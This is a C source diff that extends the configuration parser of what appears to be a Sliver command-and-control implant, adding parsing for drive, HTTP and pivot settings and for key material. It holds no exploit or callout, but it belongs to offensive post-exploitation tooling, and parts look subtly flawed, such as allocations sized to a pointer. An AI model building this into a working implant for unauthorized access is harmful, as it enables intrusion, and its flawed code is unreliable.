@@ -886,7 +886,7 @@ UINT64 GeneratePeerID()
 
 	return uResult;
 }
-PAGE_EXECUTE
+
 PGLOBAL_CONFIG UnmarshalConfig
 (
 	_In_ LPWSTR lpConfigPath
@@ -897,7 +897,9 @@ PGLOBAL_CONFIG UnmarshalConfig
 	PGLOBAL_CONFIG pResult = NULL;
 	LPVOID* UnmarshaledData = NULL;
 	PPBElement ConfigElements[16];
-	PPBElement DriveConfigElements[10];
+	PPBElement DriveConfigElements[9];
+	PPBElement HttpConfigElements[14];
+	PPBElement PivotConfigElements[3];
 	DWORD i = 0;
 
 	pMarshaledData = ReadFromFile(lpConfigPath, &cbMarshaledData);
@@ -920,9 +922,92 @@ PGLOBAL_CONFIG UnmarshalConfig
 	ConfigElements[13]->Type = RepeatedStruct;
 	ConfigElements[14]->Type = RepeatedStruct;
 	ConfigElements[15]->Type = RepeatedStruct;
+	for (i = 0; i < _countof(DriveConfigElements); i++) {
+		DriveConfigElements[i] = ALLOC(sizeof(PPBElement));
+		DriveConfigElements[i]->dwFieldIdx = i + 1;
+		DriveConfigElements[i]->Type = Bytes;
+	}
 
+	DriveConfigElements[8]->Type = Varint;
+	for (i = 0; i < _countof(HttpConfigElements); i++) {
+		HttpConfigElements[i] = ALLOC(sizeof(PPBElement));
+		HttpConfigElements[i]->dwFieldIdx = i + 1;
+		HttpConfigElements[i]->Type = RepeatedBytes;
+	}
+	
+	HttpConfigElements[6]->Type = Bytes;
+	HttpConfigElements[7]->Type = Bytes;
+	HttpConfigElements[8]->Type = Varint;
+	HttpConfigElements[9]->Type = Varint;
+	HttpConfigElements[11]->Type = Varint;
+	HttpConfigElements[12]->Type = Varint;
+	HttpConfigElements[13]->Type = Bytes;
+	for (i = 0; i < _countof(PivotConfigElements); i++) {
+		PivotConfigElements[i] = ALLOC(sizeof(PPBElement));
+		PivotConfigElements[i]->dwFieldIdx = i + 1;
+		PivotConfigElements[i]->Type = Varint;
+	}
+
+	PivotConfigElements[0]->Type = Bytes;
+	UnmarshaledData = UnmarshalStruct(ConfigElements, _countof(ConfigElements), pMarshaledData, cbMarshaledData, NULL);
+	if (UnmarshaledData == NULL) {
+		goto CLEANUP;
+	}
+
+	pResult = ALLOC(sizeof(GLOBAL_CONFIG));
+	if (UnmarshaledData[0] != NULL) {
+		pResult->lpRecipientPubKey = DuplicateStrA(((PBUFFER)UnmarshaledData[0])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[0]);
+		UnmarshaledData[0] = NULL;
+	}
+
+	if (UnmarshaledData[1] != NULL) {
+		pResult->lpPeerPubKey = DuplicateStrA(((PBUFFER)UnmarshaledData[1])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[1]);
+		UnmarshaledData[1] = NULL;
+	}
+
+	if (UnmarshaledData[2] != NULL) {
+		pResult->lpPeerPrivKey = DuplicateStrA(((PBUFFER)UnmarshaledData[2])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[2]);
+		UnmarshaledData[2] = NULL;
+	}
+
+	if (UnmarshaledData[3] != NULL) {
+		pResult->lpServerMinisignPublicKey = DuplicateStrA(((PBUFFER)UnmarshaledData[3])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[3]);
+		UnmarshaledData[3] = NULL;
+	}
+
+	if (UnmarshaledData[4] != NULL) {
+		pResult->lpSliverName = DuplicateStrA(((PBUFFER)UnmarshaledData[4])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[4]);
+		UnmarshaledData[4] = NULL;
+	}
+
+	if (UnmarshaledData[5] != NULL) {
+		pResult->lpConfigID = DuplicateStrA(((PBUFFER)UnmarshaledData[5])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[5]);
+		UnmarshaledData[5] = NULL;
+	}
+
+	if (UnmarshaledData[6] != NULL) {
+		pResult->lpPeerAgePublicKeySignature = DuplicateStrA(((PBUFFER)UnmarshaledData[6])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[6]);
+		UnmarshaledData[6] = NULL;
+	}
+
+	pResult->uEncoderNonce = UnmarshaledData[7];
+	pResult->dwMaxFailure = UnmarshaledData[8];
+	pResult->dwReconnectInterval = UnmarshaledData[9];
+	if (UnmarshaledData[10] != NULL) {
+		pResult->lpScriptPath = DuplicateStrA(((PBUFFER)UnmarshaledData[10])->pBuffer, 0);
+		FreeBuffer(UnmarshaledData[10]);
+		UnmarshaledData[10] = NULL;
+	}
 CLEANUP:
 	FREE(pMarshaledData);
+	FREE(UnmarshaledData);
 
 	return pResult;
 }
